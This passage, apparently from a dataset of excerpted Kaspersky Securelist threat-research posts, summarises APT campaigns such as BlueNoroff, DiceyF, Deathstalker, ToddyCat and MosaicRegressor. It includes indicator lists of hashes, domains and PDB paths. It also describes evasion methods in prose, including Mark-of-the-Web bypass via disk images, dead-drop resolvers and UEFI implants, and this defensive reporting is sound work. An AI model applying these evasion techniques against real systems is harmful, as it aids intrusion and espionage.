story out of the confines of a private technical report that was released last year. Created quite some time ago, StripedFly has undoubtedly fulfilled its intended purpose by successfully evading detection over the years. Many high-profile and \nsophisticated malicious software have been investigated, but this one stands out and it truly deserves attention and recognition. \nWhat was the real purpose? That remains a mystery. While ThunderCrypt ransomware suggests a commercial motive for its authors, it raises the question of why they didn't opt for the potentially more lucrative path instead. The prevailing narrative often centers around ransomware actors collecting anonymous ransoms, but this case seems to defy the norm. \nThe question remains, but only those who crafted this enigmatic malware hold the answer. It's difficult to accept the notion that such sophisticated and professionally designed malware would serve such a trivial purpose, given all the evidence to the contrary. ", "source": "securelist"}, {"title": "Introduction", "content": "The StrongPity APT is a technically capable group operating under the radar for several years. The group has quietly deployed zero-day in the past, effectively spearphished targets, and maintains a modular toolset. What is most interesting about this group's more recent activity however, is their focus on users of encryption tools, peaking this summer. In particular, the focus was on Italian and Belgian users, but the StrongPity watering holes affected systems in far more locations than just those two. Adding in their creative waterholing and poisoned installer tactics, we describe the StrongPity APT as not only determined and well-resourced, but fairly reckless and innovative as well. ", "source": "securelist"}, {"title": "Conclusion", "content": "Widely available, strong cryptography software tools help provide secure and private communications that are now easily obtained and usable. In the summer of 2016, multiple encryption-enabled software applications were targeted with watering hole, social engineering tactics, and spyware by the StrongPity APT. While watering holes and poisoned installers are tactics that have been effectively used by other APT, we have never seen the same focus on cryptographic-enabled software. When visiting sites and downloading encryption-enabled software, it has become necessary to verify the \nvalidity of the distribution site and the integrity of the downloaded file itself. Download sites not using PGP or strong digital code signing certificates need to re-examine the necessity of doing so for their own customers. We have seen other APT such as Crouching Yeti and Darkhotel distribute poisoned installers and poisoned executable code, then redistribute them through similar tactics and over p2p networks. Hopefully, simpler verification systems than the current batch of PGP and SSL applications will arise to be adopted in larger numbers. Until then, strong anti-malware and dynamic allowlisting solutions will be more necessary than ever. \nMore information about the StrongPity APT group is available to customers of Kaspersky Inteligeni ", "source": "securelist"}, {"title": "Introduction", "content": "Two years ago, we published our research into RedOctober, a complex cyber-espionage operation targeting diplomatic embassies worldwide. We named it RedOctober because we started this investigation in October 2012, an unusually hot month. \nAfter our announcement in January 2013, the RedOctober operation was promptly shut down and the network of C&Cs was dismantled. As usually happens with these big operations, considering the huge investment and number of resources behind it, they don't just \"go away\" forever. Normally, the group goes underground for a few months, redesigns the tools and the malware and resume operations. \nSee: \nRedOctober Part 1 ", "source": "securelist"}, {"title": "Conclusion", "content": "Following big announcements and public exposures of targeted attack operations, APT groups behave in a predictable manner. Most Chinese-speaking attackers simply relocate C&C servers to a different place, recompile the malware and carry on as if nothing happened. \nOther groups that are more nervous about exposure go in a hibernation mode for months or years.   \nSome may never return using the same tools and techniques. \nHowever, when a major cyber-espionage operation is exposed, the attackers are unlikely to completely shut down everything. They simply go offline for some time, completely reshuffle their tools and return with rejuvenated forces. \nWe believe this is also the case of RedOctober, which makes a classy return with Cloud Atlas. \nKaspersky products detect the malware from the Cloud Atlas toolset with the following verdicts: \nExploit.Win32.CVE-2012-0158.j Exploit.Win32.CVE-2012-0158.eu Exploit.Win32.CVE-2012-0158.aw Exploit.MSWord.CVE-2012-0158.ea HEUR:Trojan.Win32.CloudAtlas.gen HEUR:Trojan.Win32.Generic HEUR:Trojan.Script.Generic Trojan-Spy.Win32.Agent.ctda Trojan-Spy.Win32.Agent.cteq Trojan-Spy.Win32.Agent.ctgm \nTrojan-Spy.Win32.Agent.ctfh Trojan-Spy.Win32.Agent.cter Trojan-Spy.Win32.Agent.ctfk Trojan-Spy.Win32.Agent.ctfj Trojan-Spy.Win32.Agent.crtk Trojan-Spy.Win32.Agent.ctcz Trojan-Spy.Win32.Agent.cqyc Trojan-Spy.Win32.Agent.ctfg Trojan-Spy.Win32.Agent.ctfi Trojan-Spy.Win32.Agent.cquy Trojan-Spy.Win32.Agent.ctew Trojan-Spy.Win32.Agent.ctdg Trojan-Spy.Win32.Agent.ctlf Trojan-Spy.Win32.Agent.ctpz Trojan-Spy.Win32.Agent.ctdq Trojan-Spy.Win32.Agent.ctgm Trojan-Spy.Win32.Agent.ctin Trojan-Spy.Win32.Agent.ctlg Trojan-Spy.Win32.Agent.ctpd Trojan-Spy.Win32.Agent.ctps Trojan-Spy.Win32.Agent.ctpq Trojan-Spy.Win32.Agent.ctpy Trojan-Spy.Win32.Agent.ctie Trojan-Spy.Win32.Agent.ctcz Trojan-Spy.Win32.Agent.ctgz Trojan-Spy.Win32.Agent.ctpr Trojan-Spy.Win32.Agent.ctdp Trojan-Spy.Win32.Agent.ctdr Trojan.Win32.Agent.idso Trojan.Win32.Agent.idrx HEUR:Trojan.Linux.Cloudatlas.a Trojan.AndroidOS.Cloudatlas.a Trojan.IphoneOS.Cloudatlas.a ", "source": "securelist"}, {"title": "Introduction", "content": "29 AUG 2019 minute read \nEmergency Response Team (GERT) and includes experts in Europe, Latin America, North America, Russia and the Middle East. However, our operational coverage is much greater and that's why our company focused many more resources on incident response and malware analysis activities. An example of this is the advanced targeted attack investigations by the Global Research and Analysis Team (GReAT). ", "source": "securelist"}, {"title": "Conclusion", "content": "From the statistics in this report, we can conclude that cyberattacks target all types of businesses around the globe. It means that having a plan to defend and quickly respond to such attacks is no longer an option; it's a must, regardless of business type. \nMaintaining and improving an already existing incident response plan will accelerate handling of security breaches through proper containment, analysis and eradication of infected elements in the network. The risk of re-infection is reduced and defense against complex attacks is improved by utilizing the lessons learned from each incident to enhance the existing security process in the environment. \nAlong with a powerful auditing policy and a log retention period of at least six months to one year, developing guided procedures for proper handling of digital evidence will definitely help in faster and more complete analysis of incidents by experts. This results in quicker containment and reduces possible loss of assets, data or reputation. \nFrequent security assessments have proved effective in discovering weaknesses early enough to fix them and hardening overall infrastructure before adversaries reveal those weaknesses and make use of them in an offensive attack. \nFurthermore, we can see that humans are still the weakest link in the security chain. Even with a highlevel security policy and security controls in place, a single employee uneducated in information security can trigger a major compromise of the internal environment and assets. ", "source": "securelist"}, {"title": "Introduction", "content": "BlueNoroff group is a financially motivated threat actor eager to profit from its cyberattack capabilities. We have published technical details of how this notorious group steals cryptocurrency before. We continue to track the group's activities and this October we observed the adoption of new malware strains in its arsenal. The group usually takes advantage of Word documents and uses shortcut files for the initial intrusion. However, it has recently started to adopt new methods of malware delivery. \nThe first new method the group adopted is aimed at evading the Mark-of-the-Web (MOTW) flag, the security measure whereby Windows displays a warning message when the user tries to open a file downloaded from the internet. To do this, optical disk image (.iso extension) and virtual hard disk (.vhd extension) file formats were used. This is a common tactic used nowadays to evade MOTW, and BlueNoroff has also adopted it. \nIn addition, the group tested different file types to refine malware delivery methods. We observed a new Visual Basic Script, a previously unseen Windows Batch file, and a Windows executable. It seems the actors behind BlueNoroff are expanding or experimenting with new file types to convey their malware efficiently. \nAfter researching the infrastructure that was utilized, we discovered more than 70 domains used by this group, meaning they were very active until recently. Also, they created numerous fake domains that look like venture capital and bank domains. Most of the domains imitate Japanese venture capital companies, indicating that the group has an extensive interest in Japanese financial entities. ", "source": "securelist"}, {"title": "Victims", "content": "As we described in the section 'Long-lasting initial infection', we discovered that one victim in the UAE, probably a home financing company, was compromised by classic BlueNoroff group malware. This financially motivated threat actor has been attacking various cryptocurrency-related businesses lately, but also other financial companies, as in this case. \nIn addition, based on the domain naming and decoy documents, we assume, with low confidence, that the entities in Japan are on the radar of this group. In one PowerPoint sample, we observed that the actor took advantage of a Japanese venture capital company. Also, the samples we mentioned in the 'Long-lasting initial infection' section above were delivered to the victim with a Japanese file name, suggesting the target can read Japanese. ", "source": "securelist"}, {"title": "Conclusion", "content": "According to a recent report, the BlueNoroff group stole cryptocurrency worth millions using their cyberattack capabilities. It shows that this group has a strong financial motivation and actually succeeds in making profits from their cyberattacks. As we can see from our latest finding, this \nhttps://securelist.com/bluenoroff-methods-bypass-motw/108383/ \nnotorious actor has introduced slight modifications to deliver their malware. This also suggests that attacks by this group are unlikely to decrease in the near future. ", "source": "securelist"}, {"title": "Introduction", "content": "The ever-increasing role of technology in every aspect of our society has turned cybersecurity into a major sovereignty issue for all states. Due to their asymmetrical nature, offensive cyber-capabilities have been embraced by many countries that wouldn't otherwise have the resources to compete on a military or economic level with the most powerful nations of the world. Most modern inter-state conflicts and tensions today also take place in so-called cyberspace and we strongly believe that this trend will persist. \nSuch conflicts can take a vast number of forms, based on the objectives an attacker might pursue to undermine a competitor. In the context of this article, we will only focus on two of them: (1) Cyberwarfare for intelligence purposes, and (2) sabotage and interference with strategic systems in order to hinder a state's ability to govern or project power. ", "source": "securelist"}, {"title": "Conclusion", "content": "It may seem na\u00efve to imagine that the international community could at this moment reach a broad consensus regarding the rules for cyberwarfare or how the existing IHL applies to cyberspace. Yet over the past century, the world managed to define a number of acceptable rules for military conflicts: the Geneva Convention defines rights afforded to non-combatants. But while in traditional warfare it is easy to evaluate the cost (usually in human lives) of being subjected to certain practices, the nature of cybersecurity makes this quite difficult: intelligence collection and data theft are invisible, \ninformation campaigns can't always be identified as such and sabotage may be indistinguishable from accidents. In other words, decision-makers have data that shows the benefit of unregulated cyberwarfare, thanks to their own operations, but are oblivious to what it costs them. This partial vision, shared by all actors, does not encourage moderation. \nAnd so, this article closes on a pessimistic note. Do any of the parties involved have an interest in regulating cyberwarfare? If they did, would they even be aware it? Historically, means of destruction could only be downsized thanks to civil protest and public pressure. In the end, no matter how far away or even unrealistic the dream of world peace seems to be, it is still one worth fighting for. As for the information technology field, it has been described as \"young\" and \"growing\" for the past 30 years. Maybe now is the time it became \"adult\". ", "source": "securelist"}, {"title": "Introduction", "content": "Some time ago, a Kaspersky Lab customer in Latin America contacted us to say he had visited China and suspected his machine was infected with an unknown, undetected malware. While assisting the customer, we found a very interesting file in the system that is completely unrelated to China and contained no Chinese coding traces. At first look, it pretends to be a Java related application but after a quick analysis, it was obvious this was something more than just a simple Java file.  It was a targeted attack we are calling \"Machete\". ", "source": "securelist"}, {"title": "Conclusion", "content": "The \"Machete\" discovery shows there are many regional  players in the world of targeted attacks. Unfortunately, such attacks became a part of the cyber arsenal of many nations located over the world. We can be sure there are other parallel targeted attacks running now in Latin America and other regions. \nKaspersky Lab products detect malicious samples related to this targeted attack as TrojanSpy.Python.Ragua. \nNote: A fullanalysis of the Machete attacks is available to the Kaspersky Intelligent Services customers. Contact: intelreports@kaspersky.com ", "source": "securelist"}, {"title": "Introduction", "content": "In our previous blogpost on Triangulation, we discussed the details of TriangleDB, the main implant used in this campaign, its C2 protocol and the commands it can receive. We mentioned, among other things, that it is able to execute additional modules. We also mentioned that this operation was quite stealthy. This article details one important aspect of this attack \u2013 the stealth that was exercised by the threat actor behind it. Along the way, we will also reveal more information about the components used in this attack. ", "source": "securelist"}, {"title": "Conclusion", "content": "The adversary behind Triangulation took great care to avoid detection. They introduced two validators in the infection chain in order to ensure that the exploits and the implant do not get delivered to security researchers. Additionally, microphone recording could be tuned in such a way that it stopped when the screen was being used. The location tracker module may not use standard GPS functionality if this is unavailable, but rather metadata from the GSM network. \nThe attackers also showed a great understanding of iOS internals, as they used private undocumented APIs in the course of the attack. They additionally implemented in some modules support for iOS versions prior to 8.0. Recall that these were widely used before 2015, which gives an indication of just how long the code of the modules has been in use. \nLast but not least, some of the components used in this attack contain code that may indicate that they are targeting macOS systems as well, although, as of the publication date, no Triangulation traces have been encountered on macOS devices. \nEven though Operation Triangulation was executed with a high degree of stealth, we were still able to extract the full exploitation chain, as well as the implant and its plugins. If you want to find how we managed to circumvent all the protections introduced by the attackers, we encourage you to attend the SAS conference, where Igor Kuznetsov will present a talk entitled \"Operation Triangulation: \u0421onnecting the Dots\" and the story of how this long-lasting attack was put to a stop. If you are not able to make it to Phuket, you can read the blogpost summarizing this talk that we will release shortly after SAS. ", "source": "securelist"}, {"title": "Introduction", "content": "The Hacktivity 2022 security festival was held at the MOM Cultural Center in Budapest, Hungary, over two days, October $6{-}7^{\\mathrm{th}}$ 2022. One of several presentations by our GReAT researchers included an interesting set of APT activity targeting online casino development and operations environments in Southeast Asia. A recorded video of the presentation is already online. You can watch it here: \nAll of our research, including a full set of IoCs and Yara rules, is written up in the two-part report \"DiceyF Deploys GamePlayerFramework in Online Casino Development Studio\", already available to our private report subscribers. Some technical analysis from the report is provided here, along with a reference set of IoCs. You can find more information about trial and pay report subscription options at intelreports@kaspersky.com. ", "source": "securelist"}, {"title": "Conclusion", "content": "There are many interesting characteristics of DiceyF campaigns and TTPs. The group modifies their codebase over time, and develops functionality in the code throughout their intrusions. \nOrganizations need to maintain solid efforts in monitoring software deployed across their organizations. The deployment systems themselves and the deployment process require heightened monitoring and maintenance: what gets deployed, when it gets deployed, and whose credentials are being used. The systems themselves need to be hardened and security products installed and updated. \nGamePlayerFramework enabled DiceyF, the actor behind this framework, to perform cyberespionage activities with some level of stealth. The initial infection method is noteworthy in that the framework is distributed via installation packages deployed through security solution control centers. Furthermore, the components of this framework are signed with a digital certificate that makes the framework more trusted by security solutions. In order to further disguise the malicious components, attackers added a graphical interface to some of them. Such implants are masqueraded as components of a messenger that is used at the victim organizations. To make sure that victims did not become suspicious of the disguised implants, attackers obtained information about targeted organizations (such as the floor where the organization's IT department is located) and included it inside graphic windows displayed to victims. They also used service names, file paths, digital signing certificates, and other artifacts from NVIDIA, Mango, and other legitimate software. Plugins of GamePlayerFramework allow extensive monitoring of victim machines. For example, they are able to monitor keystrokes and the clipboard, browse websites located inside the organization's local network, or establish virtual desktop sessions. And over the course of several months, DiceyF developers added more encryption capabilities to better hide their logging and monitoring activities. In the future, we expect to see an increase in the number of plugins and observe more unusual defense evasion methods in this framework. \nFinally, the deployment tactic used here isn't quite as sophisticated as infecting an external component of the supply chain itself, but can be extremely effective. \nMD5 \nTifa.Downloader ddbc9081ed2c503c5e4512a8e61b5389 \nTifa.Core 49b457ee8eaa83b18cc00d2f579824c6 \nYuna.Downloader06711900cc5d7cd665bc1b6ec9d7eacf1d59e527886e4bd72df0f609239b9d58\nYuna.Downloader and Yuna.Launcher containing legitimate Newtonsoft DLL   \n0c4dae01f21c3d2fa55f38314fe34958   \n39736c93f7d9cc62cdc00438c174f8a4 \nYuna.Launcher 07d6bf2df064e97d0e635a67f083f87d 0ac4e0e08bd28e88acd4991071c98261 \nYuna.Plugin.General cb8a30fcbcb462be66462f6928c6e44a \nYuna.Plugin.ClipboardRecorder 294c22533c950d7d9d74a82729ba3841 \nYuna.PuppetLoader.CodeLauncher 07ff76be283fb44ce9e9427e12e63aa6 \nYuna.PuppetLoader.Guard 031466c63bba4eafb11f2966e765c0d2 \nYuna.PuppetLoader.Downloader 0c4dae01f21c3d2fa55f38314fe34958 19f8809d04c06bba2ad95a937f133a89 \nYuna.PuppetLoader.ProcessLoader 969ef4a64203ba2ab54a6822559600cc \nYuna.Downloader.DLL.Core 56836b19b5c35c81e006f4843ff63e51 \nMango.Sync.Updater 3a1780e6fb6250b0fb63d2884788670e 4d72e573d9c4d31371c8020ba7179daf \nVPN spoofing DLL193d192ed0cec2487d18b13aedc94cb6rascustoms.dll2bd3b84b318beb5714cac9194078607a\nDomains apps.imangolm[.]com archivess.imangoim[.]net \nPDB paths   \nD:\\Code\\Fucker\\GamePlayerFramework\\Yuna\\Yuna.Downloader\\obj\\Release\\Yuna.Downloader.pdb D:\\Code\\Fucker\\GamePlayerFramework\\Yuna\\Yuna.Launcher\\obj\\Release\\Yuna.Launcher.pdb D:\\Code\\Fucker\\GamePlayerFramework\\Yuna\\Yuna.Plugin.ClipboardRecorder\\obj\\Release\\Yuna.Plugi n.ClipboardRecorder.pdb   \nD:\\Code\\Fucker\\GamePlayerFramework\\Yuna\\Yuna.Plugin.General\\obj\\Release\\Yuna.Plugin.General.p db   \nD:\\Code\\Fucker\\GamePlayerFramework\\Yuna\\Yuna.Plugin.Installer\\obj\\Release\\Yuna.Plugin.Installer.pd b   \nD:\\Code\\Fucker\\GamePlayerFramework\\Yuna\\Yuna.PuppetLoader.CodeLauncher\\obj\\Release\\VpnS ohDesktop.pdb   \nD:\\Code\\Fucker\\GamePlayerFramework\\Yuna\\Yuna.PuppetLoader.Downloader\\obj\\Release\\Yuna.Pup petLoader.Downloader.pdb   \nD:\\Code\\Fucker\\GamePlayerFramework\\Yuna\\Yuna.PuppetLoader.Guard\\obj\\Release\\Yuna.PuppetLo ader.Guard.pdb   \nD:\\Code\\Fucker\\GamePlayerFramework\\Yuna\\Yuna.PuppetLoader.ProcessLoader\\obj\\Release\\Yuna. PuppetLoader.ProcessLoader.pdb ", "source": "securelist"}, {"title": "Introduction", "content": "Just to clarify, the above subheading isn't a normal quote, but a message that Janicab malware attempted to decode in its newest use of YouTube dead-drop resolvers (DDRs). \nWhile hunting for less common Deathstalker intrusions that use the Janicab malware family, we identified a new Janicab variant used in targeting legal entities in the Middle East throughout 2020, possibly active during 2021 and potentially extending an extensive campaign that has been traced back to early 2015 and targeted legal, financial, and travel agencies in the Middle East and Europe. \nJanicab was first introduced in 2013 as malware able to run on macOS and Windows operating systems. The Windows version has a VBscript-based implant as the final stage instead of a \nC#/PowerShell combo as observed previously in Powersing samples. The VBS-based implant samples we have identified to date have a range of version numbers, meaning it is still in development. Overall, Janicab shows the same functionalities as its counterpart malware families, but instead of downloading several tools later in the intrusion lifecycle, as was the case with EVILNUM and Powersing intrusions, the analyzed samples have most of the tools embedded and obfuscated within the dropper. \nInterestingly, the threat actor continues to use YouTube, Google+, and WordPress web services as DDRs. However, some of the YouTube links observed are unlisted and go back to 2015, indicating a possible infrastructure reuse. \nLaw firms and financial institutions continue to be most affected by Deathstalker. However, in the intrusions analyzed recently, we suspect that travel agencies are a new vertical that we haven't previously seen being targeted by this threat actor. \nMore information about Deathstalker is available to customers of Kaspersky Intelligence Reporting.   \nContact us: intelreports@kaspersky.com. ", "source": "securelist"}, {"title": "Attribution", "content": "We assess with high confidence that the intrusions discussed in this report are associated with the Deathstalker threat actor group. The attribution is based on the use of the new Janicab variant, unique TTPs, victimology, and infrastructure used by the threat actor operators. Comparative intrusion analysis of Janicab and Powersing highlights similarities in several phases of the cyber kill chain. \nIn summary: \nSame SID and metadata for LNK droppers used in previous Deathstalker intrusions;   \nSimilar persistence mechanism between Janicab and Powersing using LNK in the startup folder;   \nJanicab has a similar infection execution flow and uses interpreted-language toolsets such as VBS, VBE, and Python;   \nJanicab macOS and Windows versions have Python file naming similar to EVILNUM malware (e.g., runner.py, serial.txt, etc.); \nEVILNUM runner.py for file transfer \nJanicab2021runner.py snippet forfile transfer \nOld Janicab for MacOS runner.py for starting background service with file transfer capability \n$\\bullet$ The use of Python-based toolset and libraries is common across all Deathstalker intrusions using Janicab, Powersing, EVILNUM, and PowerPepper;   \nThe use of YouTube, among other web services/DDRs, is common across Janicab and Powersing intrusions; the method of calling and parsing YouTube and the other DDRs for C2 IP address is almost identical in Janicab, Powersing, and EVILNUM; The identified C2 IPs fall within ASNs seen previously with PowerPepper intrusions;   \nDiverse victimology with a focus on legal and financial institutions, possibly targeted by other hacker-for-hire threat groups;   \nBased on our KTAE similarities engine, the dll (Stormwind) keylogger being used is over $90\\%$ similar to an older variant seen in previous Powersing intrusions;   \n$\\bullet$ Identical code blocks in old/new Janicab and Powersing:   \ns://securelist.com/deathstalker-targets-legal-entities-with-new-janicab-variant/108131/   \nVirtual machine detection through processes and virtual MAC addresses; the listing order for the MAC addresses are identical between both malware families, and even between the 2015 and 2021 Janicab versions;   \nAlmost identical anti-analysis process detection. ", "source": "securelist"}, {"title": "Conclusion", "content": "Janicab is the oldest malware family being used by Deathstalker, dating back to 2013, and it is the least publicly known, perhaps because the associated operators have higher OPSEC standards in their practices than their counterparts operating EVILNUM and Powersing. Despite not much public \ninformation being available, the threat actor has kept developing and updating the malware code, updating the structure of the LNK droppers and switching the toolset to maintain stealthiness over a long period of time. \nBased on our telemetry, the threat actor remains focused on the Middle East and Europe as its main areas of operation, and shows a lot of interest in compromising legal and financial institutions. Despite that focus, we have historically seen the threat actor targeting other industries in rare situations; travel agencies are an example of this. This once again shows the threat actor is likely a hack-for-hire group with diverse motivation. \nSince the threat actor operators continue to use interpreted-language-based malware such as Python, VBE and VBS across their historical and recent intrusions, and largely within their malware families, this can be used to the defenders' advantage since application whitelisting and OS hardening are effective techniques to block the threat actor's intrusion attempts. Defenders should also look for Internet Explorer processes running without GUI since Janicab is using IE in hidden mode to communicate with the C2. On the network, the threat actor's use of a C2 IP address instead of domain names remains a prime method of bypassing DNS-based security controls. Instead, the threat actor is still using DDRs as the method to resolve the C2 IP address; an alternate technique for DNS resolution by using authentic, mostly allowed, public web services that allow C2 communication to blend in with legitimate traffic. This means network defenders can look for frequent visits to the DDR used, followed by HTTP sessions pointing to IP addresses instead of domain names. ", "source": "securelist"}, {"title": "Introduction", "content": "We continue covering the activities of the APT group ToddyCat. In our previous article, we described tools for collecting and exfiltrating files (LoFiSe and PcExter). This time, we have investigated how attackers obtain constant access to compromised infrastructure, what information on the hosts they are interested in, and what tools they use to extract it. \nToddyCat is an APT group that predominantly targets governmental organizations, some of them defense related, located in the Asia-Pacific region. One of the group's main goals is to steal sensitive information from hosts. \nDuring the observation period, we noted that this group stole data on an industrial scale. To collect large volumes of data from many hosts, attackers need to automate the data harvesting process as much as possible, and provide several alternative means to continuously access and monitor systems they attack. We decided to investigate how this was implemented by ToddyCat. Note that all tools described in this article are applied at the stage where the attackers have compromised high\nprivileged user credentials allowing them to connect to remote hosts. In most cases, the adversary connected, transferred and run all required tools with the help of PsExec or Impacket. ", "source": "securelist"}, {"title": "Conclusion", "content": "We looked at several tools that allow the attackers to maintain access to target infrastructures and automatically search for and collect data of interest. The attackers are actively using techniques to bypass defenses in an attempt to mask their presence in the system. \nTo protect the organization's infrastructure, we recommend adding to the firewall denylist the resources and IP addresses of cloud services that provide traffic tunneling. We also recommend limiting the range of tools administrators are allowed to use for accessing hosts remotely. Unused tools must be either forbidden or thoroughly monitored as a possible indicator of suspicious activity. In addition, users must be required to avoid storing passwords in their browsers, as it helps attackers to access sensitive information. Reusing passwords across different services poses a risk of more data becoming available to attackers. ", "source": "securelist"}, {"title": "Introduction", "content": "This article is based on technical data from Kaspersky Lab experts and their analysis of the Korablin and Morcut malicious programs. A number of conclusions have been drawn by Kaspersky Lab experts based on open source data references in the conclusion of this publication. Any questions regarding the contents of this article can be posted on Kaspersky Lab's securelist.com website, or you can contact Kaspersky Lab's PR Service directly via Kaspersky.com ", "source": "securelist"}, {"title": "Conclusion", "content": "In recent years, the world has seen some major changes that computer users have only just found out about: software programs used as cyberweapons and for cyberespionage. \nWe have also seen the emergence of privately owned companies that, according to the information on their official websites, develop and offer software to law enforcement agencies to facilitate the collection of data from user computers. Countries that do not have the requisite technical capabilities are thus able to purchase software with similar functions from private companies. In spite of the fact that most countries have laws prohibiting the creation and distribution of malicious programs, this spyware is offered with almost no attempt to conceal its functions. \nSo far, there aren't very many of these companies and almost no competition in this particular market. These conditions are highly attractive to new players and have planted the seeds for a technologies race among them. At the same time, according to Kaspersky Lab's data, these companies are not held accountable for how their tracking software is used, be it in international espionage or traditional cybercrime used by small-time scammers to make money. \nThe situation is further complicated by the possibility of these types of programs hitting the shelves on the open market, where fictitious companies, for example, could resell them however they wish. ", "source": "securelist"}, {"title": "Introduction", "content": "Kaspersky Lab has observed new waves of attacks that started on the 8th and the 27th of June 2016. These have been highly active in the Middle East region and unveiled ongoing targeted attacks in multiple regions. The attackers try to lure targets through spear phishing emails that include compressed executables. The malware collects all data such as passwords, keystrokes and screenshots, then sends it to the attackers. ", "source": "securelist"}, {"title": "Conclusion", "content": "Operation Ghoul is one of the many attacks in the wild targeting industrial, manufacturing and engineering organizations, Kaspersky Lab recommends users to be extra cautious while checking and opening emails and attachments. In addition, privileged users need to be well trained and ready to deal with cyber threats; failure in this is, in most cases, the cause behind private or corporate data leakage, reputation and financial loss. ", "source": "securelist"}, {"title": "Introduction", "content": "UEFI (or Unified Extensible Firmware Interface) has become a prominent technology that is embedded within designated chips on modern day computer systems. Replacing the legacy BIOS, it is typically used to facilitate the machine's boot sequence and load the operating system, while using a featurerich environment to do so. At the same time, it has become the target of threat actors to carry out exceptionally persistent attacks. \nOne such attack has become the subject of our research, where we found a compromised UEFI firmware image that contained a malicious implant. This implant served as means to deploy additional malware on the victim computers, one that we haven't come across thus far. To the best of our knowledge, this is the second known public case where malicious UEFI firmware in use by a threat actor was found in the wild. \nThroughout this blog we will elaborate on the following key findings: \nWe discovered rogue UEFI firmware images that were modified from their benign counterpart to incorporate several malicious modules;   \nThe modules were used to drop malware on the victim machines. This malware was part of a wider malicious framework that we dubbed MosaicRegressor; Components from that framework were discovered in a series of targeted attacks pointed towards diplomats and members of an NGO from Africa, Asia and Europe, all showing ties in their activity to North Korea;   \nCode artefacts in some of the framework's components and overlaps in C&C infrastructure used during the campaign suggest that a Chinese-speaking actor is behind these attacks, possibly having connections to groups using the Winnti backdoor; \nThe attack was found with the help of Firmware Scanner, which has been integrated into Kaspersky products since the beginning of 2019. This technology was developed to specifically detect threats hiding in the ROM BIOS, including UEFI firmware images. ", "source": "securelist"}, {"title": "Conclusion", "content": "The attacks described in this blog post demonstrate the length an actor can go in order to gain the highest level of persistence on a victim machine. It is highly uncommon to see compromised UEFI firmware in the wild, usually due to the low visibility into attacks on firmware, the advanced measures required to deploy it on a target's SPI flash chip, and the high stakes of burning sensitive toolset or assets when doing so. \nWith this in mind, we see that UEFI continues to be a point of interest to APT actors, while at large being overlooked by security vendors. The combination of our technology and understanding of the current and past campaigns leveraging infected firmware, helps us monitor and report on future attacks against such targets. \nThe full details of this research, as well as future updates on the underlying threat actor, are available to customers of the APT reporting service through our Threat Intelligence Portal. ", "source": "securelist"}, {"title": "Introduction", "content": "DeathStalker is a threat actor that's been active since at least 2012, and we exposed most of their past activities in a previous article, as well as during a GREAT Ideas conference in August 2020. The actor drew our attention in 2018 because of distinctive attack characteristics that didn't fit in with the usual cybercrime or state-sponsored activities, leading us to believe DeathStalker is a hack-for-hire group.. \nDeathStalker has leveraged several malware strains and delivery chains over the years, from the Python- and VisualBasic-based Janicab to the PowerShell-based Powersing and the JavaScriptbased Evilnum. The actor consistently used what we call \"dead-drop resolvers\" (DDRs), which is obfuscated content hosted on major public web services like YouTube, Twitter or Reddit; once decoded by malware this content reveals a command-and-control (C2) server address. DeathStalker also consistently leveraged anti-detection and antivirus evasion techniques, as well as intricate \ndelivery chains that drop lots of files to the target's filesystems. To kick-start an infection, DeathStalker usually relies on spear-phishing emails with attachments, or links to public file sharing services, as well as script execution based on Windows shortcuts. We have identified how DeathStalker's malware compromises in clusters or targets various types of entities in all parts of the world, with a possible focus on law and consultancy offices, as well as FINTECH companies, but without a clearly identifiable or consistent interest. The targeting does not seem to be politically or strategically defined and doesn't appear to be the usual financially motived crime. Because of this, we conclude that DeathStalker is a cyber-mercenary organization. \nWhile tracking DeathStalker's Powersing-based activities in May 2020, we detected a previously unknown implant that leveraged DNS over HTTPS as a C2 channel, as well as parts of its delivery chain. We named this new malware PowerPepper. We first spotted a variant of PowerPepper in the wild in mid-July 2020, dropped from a Word document that had been submitted on a public multiscanner service. Since then, the PowerPepper implant and the associated delivery chain has been continuously operating and developing. ", "source": "securelist"}, {"title": "Conclusion", "content": "It only seems fair to write that DeathStalker tried hard to develop evasive, creative and intricate tools with this PowerPepper implant and associated delivery chains. There is nothing particularly sophisticated about the techniques and tricks that are leveraged, yet the whole toolset has proved to be effective, is pretty well put together, and shows determined efforts to compromise various targets around the world. \nThis is consistent with previous knowledge of the DeathStalker actor, which has demonstrated continuous capabilities to compromise targets since 2012, and has been fast to develop new implants and toolchains. We discovered the PowerPepper implant in May 2020, and it has been improved or adapted regularly since then. At the same time, we also uncovered another previously unknown malware strain that we strongly believe is from the same actor, though we haven't identified any Powersing-related activity since our previous article on DeathStalker in August 2020. \nThe DeathStalker threat is definitely a cause for concern, with the victimology for its various malware strains showing that any corporation or individual in the world can be targeted by their malicious activities, provided someone has decided they are of interest and passed on the word to the threat actor. Luckily for defenders, DeathStalker has, until now, relied on a rather limited set of techniques to design its delivery chains, and implementing counter-measures is an attainable goal for most organizations. ", "source": "securelist"}, {"title": "Introduction", "content": "Targeted attacks are now an established part of the threat landscape, so it's no surprise to see such attacks feature in our yearly review. Last year, in our security forecast, we outlined what we saw as the likely future APT developments. \nhttps://securelist.com/kaspersky-security-bulletin-2015-top-security-stories/72886/ \nThe merger of cybercrime and APT Fragmentation of bigger APT groups Evolving malware techniques New methods of data exfiltration APT arms race \nHere are the major APT campaigns that we reported this year. \nCarbanak combined cybercrime \u2013 in this case, stealing money from financial institutions \u2013 with the infiltration techniques typical of a targeted attack. The campaign was uncovered in spring 2015: Kaspersky Lab was invited to conduct a forensic investigation of a bank's systems after some of its ATMs started to dispense cash 'randomly'. It turned out that the bank was infected. Carbanak is a backdoor designed to carry out espionage, data exfiltration and remote control of infected computers. The attackers used APT-style methods to compromise their victims \u2013 sending spearphishing e-mails to bank employees. Once installed on a bank's computer, the attackers carried out reconnaissance to identify systems related to processing, accounting and ATMs and simply mimicked the activities of legitimate employees. Carbanak used three methods to steal money: (1) dispensing cash from ATMs, (2) transferring money to cybercriminals using the SWIFT network and (3) creating fake accounts and using mule services to collect the money. The attackers targeted around 100 financial institutions, with total losses amounting to almost $\\$1$ billion. \nOne of most talked-about news stories of Q1 2015 surrounded the Equation cyber-espionage group. The attackers behind Equation successfully infected the computers of thousands of victims in Iran, ps://securelist.com/kaspersky-security-bulletin-2015-top-security-stories/72886/ \nRussia, Syria, Afghanistan, the United States and elsewhere \u2013 victims included government and diplomatic institutions, telecommunications companies and energy firms. This is one of the most sophisticated APT campaigns we've seen: one of the many modules developed by the group modifies the firmware of hard drives \u2013 providing a level of stealth and persistence beyond other targeted attacks. It's clear that development of the code stretches back to 2001 or earlier. It's also related to other notorious attacks, Stuxnet and 